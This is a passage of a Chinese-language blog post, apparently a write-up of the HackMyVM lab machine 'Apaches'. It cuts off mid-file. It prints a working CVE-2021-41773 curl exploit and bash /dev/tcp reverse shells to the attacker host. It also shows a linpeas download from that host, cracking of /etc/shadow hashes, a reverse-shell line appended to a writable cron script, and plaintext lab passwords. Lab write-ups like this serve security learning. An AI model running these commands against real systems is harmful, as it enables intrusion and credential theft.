@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# hmv_Apaches
+
+# 0. 简介
+
+**靶机**：[hackmyvm - Apaches](https://hackmyvm.eu/machines/machine.php?vm=Apaches)
+**难度**：绿色
+**目标 IP**：192.168.205.143
+**本机 IP**：192.168.205.141
+
+# 1. 扫描
+
+首先，通过 `nmap` 对靶机进行全端口扫描，检查开放端口和服务：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
+Nmap scan report for 192.168.205.143
+Host is up (0.00024s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+从扫描结果可以看到，靶机开启了 **SSH** 和 **HTTP** 服务。">
+<meta property="og:title" content="hmv_Apaches">
+<meta property="og:description" content="# hmv_Apaches
+
+# 0. 简介
+
+**靶机**：[hackmyvm - Apaches](https://hackmyvm.eu/machines/machine.php?vm=Apaches)
+**难度**：绿色
+**目标 IP**：192.168.205.143
+**本机 IP**：192.168.205.141
+
+# 1. 扫描
+
+首先，通过 `nmap` 对靶机进行全端口扫描，检查开放端口和服务：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
+Nmap scan report for 192.168.205.143
+Host is up (0.00024s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+```
+
+从扫描结果可以看到，靶机开启了 **SSH** 和 **HTTP** 服务。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_Apaches.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>hmv_Apaches</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_Apaches</h1>
+<div class="title-right">
+    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/6" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>hmv_Apaches</h1>
+<h1>0. 简介</h1>
+<p><strong>靶机</strong>：<a href="https://hackmyvm.eu/machines/machine.php?vm=Apaches" rel="nofollow">hackmyvm - Apaches</a><br>
+<strong>难度</strong>：绿色<br>
+<strong>目标 IP</strong>：192.168.205.143<br>
+<strong>本机 IP</strong>：192.168.205.141</p>
+<h1>1. 扫描</h1>
+<p>首先，通过 <code class="notranslate">nmap</code> 对靶机进行全端口扫描，检查开放端口和服务：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.143
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 13:58 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.143
+Host is up (0.00024s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:B2:79:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</pre></div>
+<p>从扫描结果可以看到，靶机开启了 <strong>SSH</strong> 和 <strong>HTTP</strong> 服务。接下来，我们对 HTTP 服务进行进一步的渗透测试。</p>
+<h1>2. 漏洞扫描与利用</h1>
+<p>通过访问 Web 服务，未发现明显的漏洞。因此，我使用 <strong>feroxbuster</strong> 对靶机进行目录爆破，虽然未获得有效的目录列表，但继续使用 <code class="notranslate">nuclei</code> 工具对靶机进行漏洞扫描，最终发现了一个高危漏洞：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nuclei -u 192.168.205.143
+...
+[INF] Running httpx on input host
+[INF] Found 1 URL from httpx
+...
+[CVE-2021-41773](https://github.com/LudovicPatho/CVE-2021-41773):RCE] [http] [high] http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
+...</pre></div>
+<p>该漏洞为 <strong><a href="https://github.com/LudovicPatho/CVE-2021-41773">CVE-2021-41773</a></strong>，是 Apache HTTP 服务器的目录遍历漏洞，能够通过访问特定路径执行命令。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh<span class="pl-pds">'</span></span> --data <span class="pl-s"><span class="pl-pds">'</span>echo Content-Type:text/plain; echo; id<span class="pl-pds">'</span></span>
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</pre></div>
+<p>执行成功后，获取了靶机的基本信息，进一步确认漏洞有效。现在我们执行反弹shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.143/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh<span class="pl-pds">'</span></span> --data <span class="pl-s"><span class="pl-pds">'</span>echo Content-Type:text/plain; echo; bash -c "bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1"<span class="pl-pds">'</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span>kali</span>
+┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8888                                
+listening on [any] 8888 ...
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 60584
+bash: cannot <span class="pl-c1">set</span> terminal process group (651): Inappropriate ioctl <span class="pl-k">for</span> device
+bash: no job control <span class="pl-k">in</span> this shell
+daemon@apaches:/usr/bin$ id
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)</pre></div>
+<h1>3. 获取稳定的 Shell</h1>
+<p>为了获取一个更加稳定的交互式 shell，执行以下命令：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash  
+ctrl+z  
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>  
+reset xterm  
+<span class="pl-k">export</span> TERM=xterm  
+<span class="pl-c1">echo</span> <span class="pl-smi">$SHELL</span>  
+<span class="pl-k">export</span> SHELL=/bin/bash  
+stty rows 59 cols 236</pre></div>
+<p>这些操作确保了与靶机的连接更为稳定，并为后续的渗透操作提供了良好的基础。</p>
+<h1>4.提权</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">daemon@apaches:/usr/bin$ <span class="pl-c1">cd</span> /home/
+daemon@apaches:/home$ ls -al
+total 24
+drwxr-xr-x  6 root       root       4096 Oct  9  2022 <span class="pl-c1">.</span>
+drwxr-xr-x 20 root       root       4096 Sep 30  2022 ..
+drwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo
+drwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas
+drwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea
+drwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto
+daemon@apaches:/home$ <span class="pl-c1">cd</span> geronimo/
+daemon@apaches:/home/geronimo$ ls -al
+total 32
+drwxr-xr-x 4 geronimo geronimo 4096 Jul 13  2023 <span class="pl-c1">.</span>
+drwxr-xr-x 6 root     root     4096 Oct  9  2022 ..
+-rw------- 1 geronimo geronimo    0 Jul 13  2023 .bash_history
+-rw-r--r-- 1 geronimo geronimo  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 geronimo geronimo 3771 Feb 25  2020 .bashrc
+drwx------ 2 geronimo geronimo 4096 Sep 30  2022 .cache
+drwxrwxr-x 3 geronimo geronimo 4096 Oct 10  2022 .local
+-rw-r--r-- 1 geronimo geronimo  807 Feb 25  2020 .profile
+-rw-r--r-- 1 geronimo geronimo    0 Oct  1  2022 .sudo_as_admin_successful
+-rw------- 1 geronimo geronimo 3827 Oct 10  2022 user.txt
+daemon@apaches:/home/geronimo$ <span class="pl-c1">cd</span> ..
+daemon@apaches:/home$ <span class="pl-c1">cd</span> pocahontas/
+daemon@apaches:/home/pocahontas$ ls -al
+total 36
+drwxr-xr-x 3 pocahontas pocahontas  4096 Oct 10  2022 <span class="pl-c1">.</span>
+drwxr-xr-x 6 root       root        4096 Oct  9  2022 ..
+-rw------- 1 pocahontas pocahontas     0 Oct 10  2022 .bash_history
+-rw-r--r-- 1 pocahontas pocahontas   220 Oct  9  2022 .bash_logout
+-rw-r--r-- 1 pocahontas pocahontas  3771 Oct  9  2022 .bashrc
+drwxrwxr-x 3 pocahontas pocahontas  4096 Oct 10  2022 .local
+-rw-r--r-- 1 pocahontas pocahontas   807 Oct  9  2022 .profile
+-rw------- 1 pocahontas pocahontas 10267 Oct 10  2022 user.txt
+daemon@apaches:/home/pocahontas$ <span class="pl-c1">cd</span> ..
+daemon@apaches:/home$ <span class="pl-c1">cd</span> sacagawea/
+daemon@apaches:/home/sacagawea$ ls -la
+total 48
+drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 <span class="pl-c1">.</span>
+drwxr-xr-x 6 root      root      4096 Oct  9  2022 ..
+-rw------- 1 sacagawea sacagawea    0 Oct 10  2022 .bash_history
+-rw-r--r-- 1 sacagawea sacagawea  220 Oct  9  2022 .bash_logout
+-rw-r--r-- 1 sacagawea sacagawea 3771 Oct  9  2022 .bashrc
+drwxrwxr-x 3 sacagawea sacagawea 4096 Oct 10  2022 .local
+-rw-r--r-- 1 sacagawea sacagawea  807 Oct  9  2022 .profile
+-rw-rw-r-- 1 sacagawea sacagawea   66 Oct 10  2022 .selected_editor
+drwxrwxr-x 2 sacagawea sacagawea 4096 Jan 22 06:06 Backup
+drwxrwxr-x 7 sacagawea sacagawea 4096 Oct 10  2022 Development
+drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 Scripts
+-rw-rw---- 1 sacagawea sacagawea 5899 Jul 13  2023 user.txt
+daemon@apaches:/home/sacagawea$ <span class="pl-c1">cd</span> Backup/
+daemon@apaches:/home/sacagawea/Backup$ ls -al
+total 23128
+drwxrwxr-x 2 sacagawea sacagawea     4096 Jan 22 06:06 <span class="pl-c1">.</span>
+drwxr-xr-x 6 sacagawea sacagawea     4096 Jul 13  2023 ..
+-rwx------ 1 sacagawea sacagawea 23673389 Jan 22 06:06 Backup.tar.gz
+daemon@apaches:/home/sacagawea/Backup$ <span class="pl-c1">cd</span> ..
+daemon@apaches:/home/sacagawea$ <span class="pl-c1">cd</span> Development/
+daemon@apaches:/home/sacagawea/Development$ ls -al
+total 68
+drwxrwxr-x 7 sacagawea sacagawea  4096 Oct 10  2022 <span class="pl-c1">.</span>
+drwxr-xr-x 6 sacagawea sacagawea  4096 Jul 13  2023 ..
+drwx------ 2 sacagawea sacagawea  4096 Oct  6  2022 admin
+drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 css
+drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 fonts
+drwxrwxr-x 4 sacagawea sacagawea  4096 Oct 10  2022 images
+-rwxrwxr-x 1 sacagawea sacagawea 33940 Oct 10  2022 index.html
+drwxrwxr-x 2 sacagawea sacagawea  4096 Oct 10  2022 js
+-rwxrwxr-x 1 sacagawea sacagawea   116 Oct 10  2022 robots.txt
+daemon@apaches:/home/sacagawea/Development$ <span class="pl-c1">cd</span> ..
+daemon@apaches:/home/sacagawea$ <span class="pl-c1">cd</span> ..
+daemon@apaches:/home$ ls -al
+total 24
+drwxr-xr-x  6 root       root       4096 Oct  9  2022 <span class="pl-c1">.</span>
+drwxr-xr-x 20 root       root       4096 Sep 30  2022 ..
+drwxr-xr-x  4 geronimo   geronimo   4096 Jul 13  2023 geronimo
+drwxr-xr-x  3 pocahontas pocahontas 4096 Oct 10  2022 pocahontas
+drwxr-xr-x  6 sacagawea  sacagawea  4096 Jul 13  2023 sacagawea
+drwxr-xr-x  4 squanto    squanto    4096 Oct 10  2022 squanto
+daemon@apaches:/home$ <span class="pl-c1">cd</span> squanto/
+daemon@apaches:/home/squanto$ ls -al
+total 36
+drwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 <span class="pl-c1">.</span>
+drwxr-xr-x 6 root    root    4096 Oct  9  2022 ..
+-rw------- 1 squanto squanto    0 Oct 10  2022 .bash_history
+-rw-r--r-- 1 squanto squanto  220 Oct  9  2022 .bash_logout
+-rw-r--r-- 1 squanto squanto 3771 Oct  9  2022 .bashrc
+drwxrwxr-x 3 squanto squanto 4096 Oct  9  2022 .local
+-rw-r--r-- 1 squanto squanto  807 Oct  9  2022 .profile
+drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 backup
+-rw-rw-r-- 1 squanto squanto  156 Oct 10  2022 todo.md
+-rw------- 1 squanto squanto 2070 Oct  9  2022 user.txt
+daemon@apaches:/home/squanto$ cat backup/
+cat: backup/: Is a directory
+daemon@apaches:/home/squanto$ <span class="pl-c1">cd</span> backup/ 
+daemon@apaches:/home/squanto/backup$ ls -al
+total 8
+drwxrwxr-x 2 squanto squanto 4096 Oct 10  2022 <span class="pl-c1">.</span>
+drwxr-xr-x 4 squanto squanto 4096 Oct 10  2022 ..
+daemon@apaches:/home/squanto/backup$ c d..
+c: <span class="pl-c1">command</span> not found
+daemon@apaches:/home/squanto/backup$ <span class="pl-c1">cd</span> ..
+daemon@apaches:/home/squanto$ cat todo.md  
+<span class="pl-c"><span class="pl-c">#</span>## Development</span>
+
+- [x] Apaches frontpage
+- [ ] Portal <span class="pl-k">for</span> administration
+- [ ] Database selection <span class="pl-k">for</span> administration
+- [ ] Hardening the system <span class="pl-k">for</span> attacks
+daemon@apaches:/home/squanto$ <span class="pl-c1">cd</span> /opt/ 
+daemon@apaches:/opt$ ls --la
+ls: unrecognized option <span class="pl-s"><span class="pl-pds">'</span>--la<span class="pl-pds">'</span></span>
+Try <span class="pl-s"><span class="pl-pds">'</span>ls --help<span class="pl-pds">'</span></span> <span class="pl-k">for</span> more information.
+daemon@apaches:/opt$ ls -la
+total 8
+drwxr-xr-x  2 root root 4096 Apr 23  2020 <span class="pl-c1">.</span>
+drwxr-xr-x 20 root root 4096 Sep 30  2022 ..
+daemon@apaches:/opt$ <span class="pl-c1">cd</span> /tmp/
+daemon@apaches:/tmp$ ls -al
+total 44
+drwxrwxrwt 11 root root 4096 Jan 22 06:04 <span class="pl-c1">.</span>
+drwxr-xr-x 20 root root 4096 Sep 30  2022 ..
+drwxrwxrwt  2 root root 4096 Jan 22 05:58 .ICE-unix
+drwxrwxrwt  2 root root 4096 Jan 22 05:58 .Test-unix
+drwxrwxrwt  2 root root 4096 Jan 22 05:58 .X11-unix
+drwxrwxrwt  2 root root 4096 Jan 22 05:58 .XIM-unix
+drwxrwxrwt  2 root root 4096 Jan 22 05:58 .font-unix
+drwx------  3 root root 4096 Jan 22 05:58 snap-private-tmp
+drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-logind.service-62l80f
+drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-resolved.service-U7wK0h
+drwx------  3 root root 4096 Jan 22 05:58 systemd-private-7c7f0624156347a09696b3a6f76025fd-systemd-timesyncd.service-6HVyEh
+
+daemon@apaches:/tmp$ wget 192.168.205.141/linpeas.sh
+--2025-01-22 06:10:32--  http://192.168.205.141/linpeas.sh
+Connecting to 192.168.205.141:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 824847 (806K) [text/x-sh]
+Saving to: <span class="pl-s"><span class="pl-pds">'</span>linpeas.sh<span class="pl-pds">'</span></span>
+
+linpeas.sh                                                   0%[                                                                       linpeas.sh                                                 100%[<span class="pl-k">========================================================================================================================================&gt;</span>] 805.51K  --.-KB/s    <span class="pl-k">in</span> 0.02s   
+
+2025-01-22 06:10:32 (49.1 MB/s) - <span class="pl-s"><span class="pl-pds">'</span>linpeas.sh<span class="pl-pds">'</span></span> saved [824847/824847]
+
+daemon@apaches:/tmp$ chmod +x linpeas.sh 
+daemon@apaches:/tmp$ bash linpeas.sh 
+═╣ Can I <span class="pl-c1">read</span> shadow files<span class="pl-k">?</span> ............. root:<span class="pl-k">*</span>:18375:0:99999:7:::                                                                
+daemon:<span class="pl-k">*</span>:18375:0:99999:7:::
+bin:<span class="pl-k">*</span>:18375:0:99999:7:::
+sys:<span class="pl-k">*</span>:18375:0:99999:7:::
+sync:<span class="pl-k">*</span>:18375:0:99999:7:::
+games:<span class="pl-k">*</span>:18375:0:99999:7:::
+man:<span class="pl-k">*</span>:18375:0:99999:7:::
+lp:<span class="pl-k">*</span>:18375:0:99999:7:::
+mail:<span class="pl-k">*</span>:18375:0:99999:7:::
+news:<span class="pl-k">*</span>:18375:0:99999:7:::
+uucp:<span class="pl-k">*</span>:18375:0:99999:7:::
+proxy:<span class="pl-k">*</span>:18375:0:99999:7:::
+www-data:<span class="pl-k">*</span>:18375:0:99999:7:::
+backup:<span class="pl-k">*</span>:18375:0:99999:7:::
+list:<span class="pl-k">*</span>:18375:0:99999:7:::
+irc:<span class="pl-k">*</span>:18375:0:99999:7:::
+gnats:<span class="pl-k">*</span>:18375:0:99999:7:::
+nobody:<span class="pl-k">*</span>:18375:0:99999:7:::
+systemd-network:<span class="pl-k">*</span>:18375:0:99999:7:::
+systemd-resolve:<span class="pl-k">*</span>:18375:0:99999:7:::
+systemd-timesync:<span class="pl-k">*</span>:18375:0:99999:7:::
+messagebus:<span class="pl-k">*</span>:18375:0:99999:7:::
+syslog:<span class="pl-k">*</span>:18375:0:99999:7:::
+_apt:<span class="pl-k">*</span>:18375:0:99999:7:::
+tss:<span class="pl-k">*</span>:18375:0:99999:7:::
+uuidd:<span class="pl-k">*</span>:18375:0:99999:7:::
+tcpdump:<span class="pl-k">*</span>:18375:0:99999:7:::
+landscape:<span class="pl-k">*</span>:18375:0:99999:7:::
+pollinate:<span class="pl-k">*</span>:18375:0:99999:7:::
+sshd:<span class="pl-k">*</span>:19265:0:99999:7:::
+systemd-coredump:<span class="pl-k">!!</span>:19265::::::
+geronimo:<span class="pl-smi">$6</span><span class="pl-smi">$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ</span>/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
+lxd:<span class="pl-k">!</span>:19265::::::
+squanto:<span class="pl-smi">$6</span><span class="pl-smi">$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7</span>.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
+sacagawea:<span class="pl-smi">$6$7</span>jhI/21/BZR5KyY6<span class="pl-smi">$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od</span>/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
+pocahontas:<span class="pl-smi">$6</span><span class="pl-smi">$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq</span>.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::                                                                                                                                  
+═╣ Can I <span class="pl-c1">read</span> shadow plists<span class="pl-k">?</span> ............ No
+═╣ Can I write shadow plists<span class="pl-k">?</span> ........... No                                                                                       
+═╣ Can I <span class="pl-c1">read</span> opasswd file<span class="pl-k">?</span> ............. No                                                                                       
+═╣ Can I write <span class="pl-k">in</span> network-scripts<span class="pl-k">?</span> ...... No                                                                                       
+═╣ Can I <span class="pl-c1">read</span> root folder<span class="pl-k">?</span> .............. No                   </pre></div>
+<p>我去......我是没想到它<code class="notranslate">/etc/shadow</code>是可读的。我们将数据提取出来爆破</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ cat <span class="pl-c1">hash</span>
+geronimo:<span class="pl-smi">$6</span><span class="pl-smi">$Ms03aNp5hRoOuZpM$CoHMkl9rgA0jZR2D9FfGJms9dR8OZw5j0gimH0V14DJ</span>/F2Xp2.Mun4ESEdoNMoPC5ioRuOCXgakCB2snc6yiw0:19275:0:99999:7:::
+squanto:<span class="pl-smi">$6</span><span class="pl-smi">$KzBC2ThBhmbVBy0J$eZSVdFLsAfd8IsbcAaBzHp8DzKXETPUH9FKsnlivIFSCvs0UBz1zsh9OfPmKcX5VaP7</span>.Cy3r1r5msibslk0Sd.:19274:0:99999:7:::
+sacagawea:<span class="pl-smi">$6$7</span>jhI/21/BZR5KyY6<span class="pl-smi">$ry9zrhuggELLYnGkMtUi0UHBdDDaOiIgSB9y9od</span>/73Qxk/nQOSzJNo3VKzZYS8pnluVYkXhVvghOzNCPBx79T1:19274:0:99999:7:::
+pocahontas:<span class="pl-smi">$6</span><span class="pl-smi">$ecLWB6Q6bVJrGFu8$KgkvUSbQzXB6v3aJuE9NMwVvs2a53APkgzSxPq</span>.DWfgIYKbzN0svWT4VDYm/l2ku7lMGJ8dxKi1fGphRx1tO8/:19274:0:99999:7:::
+
+┌──(kali㉿kali)-[~/test]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span> 
+Using default input encoding: UTF-8
+Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) <span class="pl-smi">$6</span>$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 <span class="pl-k">for</span> all loaded hashes
+Will run 12 OpenMP threads
+Press <span class="pl-s"><span class="pl-pds">'</span>q<span class="pl-pds">'</span></span> or Ctrl-C to abort, almost any other key <span class="pl-k">for</span> status
+iamtheone        (squanto)   
+1g 0:00:02:02 6.84% (ETA: 14:47:27) 0.008181g/s 9123p/s 27696c/s 27696C/s 14032519..1234victor
+Use the <span class="pl-s"><span class="pl-pds">"</span>--show<span class="pl-pds">"</span></span> option to display all of the cracked passwords reliably
+Session aborted
+</pre></div>
+<p>我们登录上去，继续提权</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">squanto@apaches:/home/sacagawea$ id
+uid=1001(squanto) gid=1001(squanto) groups=1001(squanto),1004(Lipan)
+squanto@apaches:/home/sacagawea$ find / -group Lipan <span class="pl-k">2&gt;</span>/dev/null
+/home/sacagawea/Scripts/backup.sh
+squanto@apaches:/home/sacagawea$ <span class="pl-c1">cd</span> /home/sacagawea/Scripts/
+squanto@apaches:/home/sacagawea/Scripts$ ls -al
+total 12
+drwxrwxr-x 2 sacagawea sacagawea 4096 Oct 10  2022 <span class="pl-c1">.</span>
+drwxr-xr-x 6 sacagawea sacagawea 4096 Jul 13  2023 ..
+-rwxrwx--- 1 sacagawea Lipan      182 Oct 10  2022 backup.sh
+squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+rm -rf /home/sacagawea/Backup/Backup.tar.gz
+tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
+chmod 700 /home/sacagawea/Backup/Backup.tar.gz</pre></div>
+<p>有一个脚本文件，看着就像定时任务，而且我们可以修改，我们加个反弹shell上去</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">squanto@apaches:/home/sacagawea/Scripts$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1'<span class="pl-pds">"</span></span> <span class="pl-k">&gt;&gt;</span> backup.sh 
+squanto@apaches:/home/sacagawea/Scripts$ cat backup.sh 
+<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+
+rm -rf /home/sacagawea/Backup/Backup.tar.gz
+tar -czvf /home/sacagawea/Backup/Backup.tar.gz /usr/local/apache2.4.49/htdocs
+chmod 700 /home/sacagawea/Backup/Backup.tar.gz
+bash -c <span class="pl-s"><span class="pl-pds">'</span>bash -i &gt;&amp; /dev/tcp/192.168.205.141/8889 0&gt;&amp;1<span class="pl-pds">'</span></span></pre></div>
+<p>我们稍等片刻</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ nc -lvnp 8889                                
+listening on [any] 8889 ...
+id
+connect to [192.168.205.141] from (UNKNOWN) [192.168.205.143] 50796
+bash: cannot <span class="pl-c1">set</span> terminal process group (48786): Inappropriate ioctl <span class="pl-k">for</span> device
+bash: no job control <span class="pl-k">in</span> this shell
+sacagawea@apaches:<span class="pl-k">~</span>$ id
+uid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)</pre></div>
+<p>继续提权</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sacagawea@apaches:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> Development/
+sacagawea@apaches:<span class="pl-k">~</span>/Development$ ls
+ls
+admin
+css
+fonts
+images
+index.html
+js
+robots.txt
+sacagawea@apaches:<span class="pl-k">~</span>/Development$ <span class="pl-c1">cd</span> admin/
+sacagawea@apaches:<span class="pl-k">~</span>/Development/admin$ ls
+ls
+1a-login.php
+1b-login.css
+2-check.php
+3-protect.php
+sacagawea@apaches:<span class="pl-k">~</span>/Development/admin$ cat 2-check.php 
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>php
+// (A) START SESSION
+<span class="pl-en">session_start</span>();
+
+// (B) HANDLE LOGIN
+<span class="pl-k">if</span> (isset(<span class="pl-smi">$_POST</span>[<span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span>]) <span class="pl-k">&amp;&amp;</span> <span class="pl-k">!</span>isset(<span class="pl-smi">$_SESSION</span>[<span class="pl-s"><span class="pl-pds">"</span>user<span class="pl-pds">"</span></span>])) {
+  // (B1) USERS <span class="pl-k">&amp;</span> PASSWORDS - SET YOUR OWN <span class="pl-k">!</span>
+  <span class="pl-smi">$users</span> = [
+    <span class="pl-s"><span class="pl-pds">"</span>geronimo<span class="pl-pds">"</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">"</span>12u7D9@4IA9uBO4pX9#6jZ3456<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>pocahontas<span class="pl-pds">"</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">"</span>y2U1@8Ie&amp;OHwd^Ww3uAl<span class="pl-pds">"</span></span>,
+    <span class="pl-s"><span class="pl-pds">"</span>squanto<span class="pl-pds">"</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">"</span>4Rl3^K8WDG@sG24Hq@ih<span class="pl-pds">"</span></span>,
